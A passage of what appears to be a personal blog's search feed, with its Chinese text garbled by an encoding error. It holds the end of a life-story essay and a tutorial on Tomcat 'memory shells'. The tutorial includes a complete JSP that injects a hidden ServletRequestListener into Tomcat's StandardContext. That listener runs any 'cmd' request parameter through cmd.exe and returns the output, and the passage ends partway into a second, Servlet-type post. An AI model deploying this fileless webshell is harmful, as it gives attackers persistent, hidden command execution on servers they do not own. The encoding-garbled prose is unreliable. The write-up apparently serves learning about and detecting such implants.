ä»¶ç‰¹åˆ«è®©æˆ‘æ„éš¾å¹³çš„äº‹æƒ…ã€‚ç¬¬ä¸€ä»¶äº‹å¦ˆå¦ˆåœ¨é«˜è€ƒå‰æ¥å¸¦æˆ‘ï¼Œé—®äº†æˆ‘ä¸€å¥èƒ½è€ƒä¸ŠäºŒæœ¬å—ï¼Ÿé‚£æ—¶å€™è¯´å®è¯åœ¨ä½“è‚²è¿‡çº¿çš„æƒ…å†µä¸‹ã€‚æˆ‘å°±æ˜¯éšä¾¿ä¹±è€ƒï¼Œæˆ‘éƒ½èƒ½è€ƒäºŒæœ¬ã€‚é‚£æ—¶å€™ç¬¬ä¸€æ¬¡è§‰å¾—å¦ˆå¦ˆå¯¹äºæˆ‘çš„äººç”Ÿå¯èƒ½çœŸçš„ä¸äº†è§£ã€‚ä¹Ÿè®©æˆ‘è§‰å¾—å­¤ç‹¬ã€‚é‚£ä¹ˆåˆå›åˆ°æˆ‘ä¸ºä»€ä¹ˆå†™ä¸‹è¿™ç¯‡æ–‡ç« ï¼Ÿå› ä¸ºæŠ–éŸ³çœ‹åˆ°äº†åˆä¸€å¹´çš„å•æ‹›ã€‚é‚£æ—¶å€™æˆ‘çœŸçš„å¾ˆè‹¦å¾ˆç´¯ã€‚å¯èƒ½æ˜¯æˆ‘äººç”Ÿä¸­æœ€ç´¯çš„ä¸€æ®µæ—¶é—´ï¼Œè‡³ä»Šæˆ‘éƒ½ä¸è®¤ä¸ºä»¥åä¼šæœ‰æ¯”è¿™æ›´è‹¦çš„æ—¥å­ã€‚é‚£ä½“è‚²å¸¦ç»™æˆ‘ä»€ä¹ˆï¼Ÿæ˜¯å¯¹800mçš„ä¸å±ˆï¼Œä»¥åŠå¯¹äººç”Ÿçš„ä¸å±ˆã€‚ä½“è‚²çš„å¸¦ä¸ªæˆ‘çš„è‚¯å®šè¿œè¿œä¸æ­¢äºæ­¤ã€‚å¹¶ä¸”ä»–ç¡®ç¡®å®å®æ˜¯æˆ‘çš„ä¸€ä¸ªè½¬æŠ˜ç‚¹ã€‚ä¹Ÿæ­£æ˜¯å› ä¸ºå®ƒï¼Œæˆ‘è§‰å¾—æˆ‘å¯ä»¥æ›´å¥½ï¼Œæˆ‘é€‰æ‹©äº†å¤è¯»ã€‚æˆ‘ä»¥åè¦èµšå¾ˆå¤šçš„é’±ã€‚ï¼ˆé‚£æ—¶å€™å› ä¸ºå®¶åº­ä¹°æˆ¿å­çš„åŸå› ï¼Œæˆ‘è®¤ä¸ºæˆ‘å­¦ä½“è‚²å½•å–çš„å­¦æ ¡ï¼Œæˆ‘å°†æ¥é ä»–å¯èƒ½èµšä¸åˆ°å¤§é’±ã€‚å“ˆå“ˆå“ˆï¼Œç°åœ¨çœ‹æ¥è¿™ä¸ªæƒ³æ³•æœ‰äº›å¤©çœŸã€‚ï¼‰ä½†æ˜¯çˆ±æˆ‘çš„é‚£ä¸¤ä½ï¼Œä¾ç„¶æ”¯æŒæˆ‘å»å¤è¯»ã€‚äºæ˜¯æˆ‘åˆè¸ä¸Šç¦»å®¶ä¹‹æ—…ï¼Œæ¥åˆ°ç»µé˜³å—å±±å®éªŒä¸­å­¦ã€‚è¿™é‡Œä¹Ÿæ˜¯æˆ‘çš„äººç”Ÿä¸€ä¸ªè½¬æŠ˜ç‚¹ã€‚<br>â€‹    ä¸ºä»€ä¹ˆï¼Ÿè¿™ä¸€å¹´æˆ‘åˆä¸€æ¬¡æ˜ç™½äº†äººè‡ªå·±ä¸è¡Œåˆ«æƒ³åˆ«äººçœ‹çš„èµ·ä½ ï¼Œåœ¨ç­ä¸»ä»»çš„ç®¡ç†ä¸‹ï¼Œæˆ‘çœŸçš„æƒ³è¦é€ åã€‚ä½†æ˜¯æˆ‘æ˜¯èŠ±é’±è¿›æ¥ï¼Œè¯·ä»–æ•™æˆ‘å­¦ä¹ çš„ã€‚emmmmmã€‚å¹¶ä¸”åœ¨è¿™ä¸€å¹´ä¸­æˆ‘ç¢°åˆ°äº†æˆ‘çš„å¥³å­©å­ï¼Œä¹Ÿæ²¡æœ‰æƒ³åˆ°å¥¹çœŸçš„ä¼šè·Ÿæˆ‘åœ¨ä¸€èµ·ã€‚å†™çš„æœ‰ç‚¹ç´¯äº†ã€‚çªç„¶æƒ³èµ·æ¥ï¼Œæˆ‘è¿˜æœ‰å°å­¦çš„è®°å¿†ã€‚<br>â€‹    å°å­¦çš„è®°å¿†ï¼Œå¯èƒ½æ˜¯è®©æˆ‘ç‹¬ç«‹çš„çœŸæ­£åŸå› ã€‚æˆ‘çš„çˆ¶æ¯åœ¨ï¼Œçˆ¶äº²å› ä¸ºä¸€äº›è¿æ³•çš„äº‹æƒ…ï¼Œå¦ˆå¦ˆå’Œçˆ¶äº²åˆ†å¼€äº†ã€‚è¿™æ˜¯è®©æˆ‘ä¸çˆ±å­¦ä¹ å’Œè„¾æ°”æš´èºçš„åŸå› ï¼ˆæˆ‘è®¤ä¸ºï¼‰ã€‚è¿™é‡Œå°±ç®€å•è¯´è¯´è¿™äº›å½±å“æˆ‘çš„äº‹æƒ…ï¼ˆå…¶å®çˆ¶æ¯åˆ†å¼€å¯¹æˆ‘å½±å“å¾ˆå¤§ï¼Œä½†æ˜¯æˆ‘ä¸æƒ³å†å»æƒ³ã€‚ï¼‰é‚£æ—¶å€™åº”è¯¥æ˜¯çˆ¶æ¯åˆšåˆ°æ— é”¡æ²¡å¤šä¹…ï¼Œæˆ‘ä¹‹å‰çš„è®°å¿†åŸºæœ¬éƒ½ä¸è®°å¾—äº†ã€‚æˆ‘åªè®°å¾—é‚£æ—¶å€™ï¼Œæˆ‘ä»¬ä½åœ¨ä¸€ä¸ª20å¹³ç±³ä¸åˆ°çš„å‡ºç§Ÿæˆ¿ï¼Œæˆ‘è¦æ¯å¤©5.30èµ·åºŠå»ä¹˜11è·¯å…¬äº¤ï¼Œé‚£æ—¶å€™æˆ‘ä¸ŠäºŒå¹´çº§ã€‚é‚£æ—¶å€™æˆ‘åªä¼šå¬çˆ¸çˆ¸å¦ˆå¦ˆçš„è¯ï¼Œä»å†œæ‘å©†å©†èº«è¾¹å›åˆ°å¤§åŸå¸‚ï¼Œå­¦ä¼šè¿‡æ–‘é©¬çº¿ï¼Œçœ‹çº¢ç»¿ç¯ã€‚ç„¶åä¸€ä¸ªäººä¹˜11è·¯å…¬äº¤ï¼Œä»äº”çˆ±åŒ—è·¯åè½¦åˆ°è¿æ²³é¥­åº—ï¼Œç„¶åèµ°20minçš„è·¯ç¨‹åˆ°è¾¾è ¡æ¡¥å°å­¦ã€‚<br>â€‹    æˆ‘ä¸€ç›´è®¤ä¸ºé‚£æ—¶å€™çš„æˆ‘å¾ˆæ£’ã€‚ä½†æ˜¯å½“æ—¶åªæ˜¯è§‰å¾—å¬çˆ¸çˆ¸å¦ˆå¦ˆçš„è¯è€Œå·²ã€‚ä»…æ­¤è€Œå·²ã€‚<br>â€‹    ç°åœ¨çš„æˆ‘ä¾æ—§æœ‰æ—¶å€™ä¸æƒ³å­¦ä¹ ï¼Œæœ‰æ—¶å€™å·æ‡’ï¼Œä½†æ˜¯æˆ‘ä¸€å®šä¼šåšæŒæ…¢æ…¢å˜å¥½ã€‚æˆ‘å¸Œæœ›å¯¹çš„èµ·æˆ‘è‡ªå·±ï¼Œä»¥åŠèº«è¾¹è®¸è®¸å¤šå¤šç›¸ä¿¡æˆ‘çš„äººï¼Œä¹Ÿå¸Œæœ›èº«è¾¹èƒ½å¿å—æˆ‘åä¹ æƒ¯ã€è„¾æ°”çš„äººã€‚æˆ‘å—åˆ°çš„å®¶åº­æ•™è‚²ç¡®å®ä¸å¤šï¼Œä½†æ˜¯çˆ¶æ¯ä»¥åŠæˆ‘çš„å®¶äººç¡®ç¡®å®å®ç»™äº†æˆ‘åº”æœ‰çš„ã€‚æˆ‘ä¹Ÿå˜å¾—ä»ä»¥å‰é‚£ä¸ªåªä¼šè¯´æ¯äº²é™¤äº†ç»™æˆ‘é’±ä¹‹å¤–ä»€ä¹ˆéƒ½æ²¡ç»™æˆ‘çš„å°å®¶ä¼™ï¼Œæˆé•¿ä¸ºå¶å°”å…³å¿ƒä¸€ä¸‹æ¯äº²èº«ä½“ã€å¸®å©†å©†æ‹–åœ°çš„äººã€‚<br>â€‹    åˆšå¥½è¿™å†™ä¸€å†™æ–‡ç« çªç„¶æ”¾æ¾äº†å¾ˆå¤šã€‚è€Œä¸æ˜¯æ‰“äº†åŠå¤©çš„cf~~~ã€‚2022ç»§ç»­å¥½å¥½æ”¹é€ ä¸€ä¸‹è‡ªå·±å­ï¼Ÿæ¯•ç«Ÿ2021çš„æœ«å°¾æˆ‘æˆåŠŸæˆ’æ‰äº†ç‹è€…è£è€€ï¼äº‰å–èŠ±æ›´å¤šçš„æ—¶é—´åœ¨å­¦ä¹ ä»¥åŠæ›´å¤šæœ‰æ„ä¹‰çš„äº‹æƒ…ä¸Šã€‚ä¸æ±‚è‡ªå·±å˜å¤šå¥½å¤šæœ‰é’±ï¼Œåªæ±‚åœ¨æœªæ¥æˆ‘æˆåŠŸåšå¥½æˆ‘çš„æ¯ä¸€ä»»èº«ä»½ï¼Œåœ¨äººç”Ÿè·¯ä¸Šæ…¢æ…¢è¿›æ­¥ï¼è®©å©†å©†ã€å¦ˆå¦ˆã€å¥³æœ‹å‹èƒ½å› ä¸ºæˆ‘çš„å­˜åœ¨è€Œè‡ªè±ªå¹¸ç¦ã€‚<br>â€‹    å¸Œæœ›è‡ªå·±æ°¸è¿œä¸å±ˆï¼Œé¡¶å¤©ç«‹åœ°ï¼</p>]]></content>
    
    
    <categories>
      
      <category>å†ç¨‹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å†ç¨‹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å†…å­˜é©¬ï¼šListenerå‹</title>
    <link href="/2022/04/15/%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9AListener%E5%9E%8B/"/>
    <url>/2022/04/15/%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9AListener%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="Tomcat-å†…å­˜é©¬ï¼šListenerå‹"><a href="#Tomcat-å†…å­˜é©¬ï¼šListenerå‹" class="headerlink" title="Tomcat å†…å­˜é©¬ï¼šListenerå‹"></a>Tomcat å†…å­˜é©¬ï¼šListenerå‹</h1><p>å­¦ä¹ <a href="http://wjlshare.com/archives/1651">å¤©ä¸‹å¤§æœ¨å¤´</a></p><p>åœ¨Listenerå†…å­˜é©¬ä¸­ï¼Œæƒ³è¦è§¦å‘Listenerã€‚å°±éœ€è¦å®ç°EventListeneræ¥å£ã€‚å¹¶ä¸”è¿˜è¦æ»¡è¶³æ¯å‘é€ä¸€ä¸ªè¯·æ±‚éƒ½éœ€è¦è§¦å‘Listenerã€‚<br>äºæ˜¯æ‰¾åˆ°äº† <code>ServletRequestListener</code></p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletRequestEvent;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestListener;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        ServletRequestListener.<span class="hljs-built_in">super</span>.requestDestroyed(sre);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        ServletRequestListener.<span class="hljs-built_in">super</span>.requestInitialized(sre);<br>        System.out.println(<span class="hljs-string">&quot;hello xsw6a&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨æ¯æ¬¡è¯·æ±‚çš„æ—¶å€™ï¼Œéƒ½ä¼šå¼¹å‡º<code>hello xsw6a</code>,ä¹Ÿå°±æ˜¯æ»¡è¶³äº†ã€‚é‚£æ¥ä¸‹æ¥å°±æ˜¯åœ¨<code>requestInitialized</code>æ–¹æ³•ä¸­æ„é€ æ¶æ„ä»£ç ã€‚<strong>é¦–å…ˆè¦ç¡®å®šçš„æ˜¯èƒ½å¤Ÿæ¥å—å‘é€è¿‡æ¥çš„è¯·æ±‚</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾ sre çš„ä¸€ä¸ªæ–¹æ³•æ¥è·å–åˆ°è¯·æ±‚ï¼Œå¹¶ä¸”ç”¨Runtimeæ¥å®ç°æ¶æ„ä»£ç æ‰§è¡Œã€‚</p><p>è¿™é‡Œçœ‹åˆ°è¯¥ç±»çš„æ¥å£ç±»æ˜¯ServletRequestï¼Œé‚£ä¹ˆå…¶å®ç°ç±»æ˜¯é‚£é‡Œå‘¢ï¼Ÿ</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204150000816.png" alt="QQæˆªå›¾20220414215644"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204150000112.png" alt="QQæˆªå›¾20220414220512"></p><p>å¯ä»¥çœ‹åˆ°å…¶å®ç°ç±»ä¸ºorg.apache.catalina.connector.RequestFacadeã€‚è·Ÿè¿›å»çœ‹ä¸€ä¸‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204150000495.png" alt="QQæˆªå›¾20220414221031"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletRequestEvent;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestListener;<br><br><span class="hljs-keyword">import</span> org.apache.catalina.connector.Request;<br><span class="hljs-keyword">import</span> org.apache.catalina.connector.Response;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        ServletRequestListener.<span class="hljs-built_in">super</span>.requestDestroyed(sre);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        ServletRequestListener.<span class="hljs-built_in">super</span>.requestInitialized(sre);<br>        System.out.println(<span class="hljs-string">&quot;hello xsw6a&quot;</span>);<br>        String cmd;<br>        <span class="hljs-keyword">try</span> &#123;<br>             cmd = sre.getServletRequest().getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            org.apache.catalina.connector.RequestFacade servletRequest= (org.apache.catalina.connector.RequestFacade) sre.getServletRequest();<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>            request.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Request</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Request) request.get(servletRequest);<br>            <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> o.getResponse();<br><br>            <span class="hljs-keyword">if</span>(cmd!=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">cmd1</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>                <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>                <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                <span class="hljs-keyword">while</span>((i=cmd1.read(bytes))!=-<span class="hljs-number">1</span>)&#123;<br>                    response.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-number">0</span>, i));<br>                    response.getWriter().write(<span class="hljs-string">&quot;\r\n&quot;</span>);<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åé¢ä¸æƒ³æˆªå›¾äº†ã€‚è·Ÿç€å¤©ä¸‹å¤§æœ¨å¤´å¸ˆå‚…è°ƒè¯•äº†ä¸€ä¸‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204150000688.png" alt="QQæˆªå›¾20220414235123"></p><p>è¿™ä¸ª listener å°±æ˜¯æˆ‘ä»¬çš„æ¶æ„ Listener å®ä¾‹ã€‚è€Œè¿™ä¸ªlinteneræ˜¯ç”±instancesæ§åˆ¶ã€‚instancesæ˜¯ç”±</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204150000184.png" alt="QQæˆªå›¾20220414235128"></p><p>å…¶æ§åˆ¶ã€‚é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´åªè¦å°†listenæ·»åŠ åˆ°applicationEventListenersListçš„æ•°ç»„é‡Œé¢å³å¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Object[] objects = standardContext.getApplicationEventListeners();<br> List&lt;Object&gt; listeners = Arrays.asList(objects);<br> List&lt;Object&gt; arrayList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(listeners);<br> arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyListener</span>());<br> standardContext.setApplicationEventListeners(arrayList.toArray());<br> out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="å®Œæ•´å†…å­˜é©¬"><a href="#å®Œæ•´å†…å­˜é©¬" class="headerlink" title="å®Œæ•´å†…å­˜é©¬"></a>å®Œæ•´å†…å­˜é©¬</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.List&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Arrays&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.ArrayList&quot;</span> %&gt;&lt;%--<br>  Created by IntelliJ IDEA.<br>  User: <span class="hljs-number">18282</span><br>  Date: <span class="hljs-number">2022</span>/<span class="hljs-number">4</span>/<span class="hljs-number">14</span><br>  Time: <span class="hljs-number">9</span>:<span class="hljs-number">41</span><br>  To change <span class="hljs-built_in">this</span> template use File | Settings | File Templates.<br>--%&gt;<br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>            <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    in = Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c&quot;</span>,req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125;).getInputStream();<br>                    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> s.hasNext()?s.next():<span class="hljs-string">&quot;&quot;</span>;<br>                    <span class="hljs-type">Field</span> <span class="hljs-variable">requestF</span> <span class="hljs-operator">=</span> req.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>                    requestF.setAccessible(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (Request)requestF.get(req);<br>                    request.getResponse().getWriter().write(out);<br>                &#125;<br>                <span class="hljs-keyword">catch</span> (IOException e) &#123;&#125;<br>                <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;&#125;<br>                <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;&#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;&#125;<br>    &#125;<br>%&gt;<br><br>&lt;%<br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br><br>    Object[] objects = standardContext.getApplicationEventListeners();<br>    List&lt;Object&gt; listeners = Arrays.asList(objects);<br>    List&lt;Object&gt; arrayList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(listeners);<br>    arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyListener</span>());<br>    standardContext.setApplicationEventListeners(arrayList.toArray());<br>    out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br><br>%&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å†…å­˜é©¬</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å†…å­˜é©¬ï¼šServletå‹</title>
    <link href="/2022/04/13/%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9AServlet%E5%9E%8B/"/>
    <url>/2022/04/13/%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9AServlet%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="Tomcat-å†…å­˜é©¬ï¼šServletå‹"><a href="#Tomcat-å†…å­˜é©¬ï¼šServletå‹" class="headerlink" title="Tomcat å†…å­˜é©¬ï¼šServletå‹"></a>Tomcat å†…å­˜é©¬ï¼šServletå‹</h1><p>çœ‹äº†su18çš„æ–‡ç« ï¼</p><p>é¦–å…ˆçœ‹ä¸€ä¸‹org.apache.catalina.core.ApplicationFilterChain#addServletã€‚<br>å¯ä»¥çŸ¥é“</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204132140674.png" alt="img"></p><p>æˆ‘è¿˜æ˜¯æŒ‰ç…§Filterçš„æ€è·¯å»åˆ›å»ºServletã€‚ç„¶åæ€è·¯å°±å¯ä»¥å‡ºæ¥äº†ã€‚å…ˆåå°„åˆ›å»ºå‡ºStandardContextï¼Œä½¿å…¶ä½¿ç”¨creatWrapperæ¥åˆ›å»ºä¸€ä¸ªæ¶æ„çš„Servletã€‚</p><p><a href="https://xz.aliyun.com/t/11084#toc-0">https://xz.aliyun.com/t/11084#toc-0</a></p><p>è¿™é‡Œåˆ†æäº†Servletçš„åˆ›å»ºè¿‡ç¨‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204132200001.png" alt="QQæˆªå›¾20220413214850"></p><p>ä¸»è¦æ˜¯é€šè¿‡è¿™äº›æ¥è¯•ç€Servletã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204132200598.png" 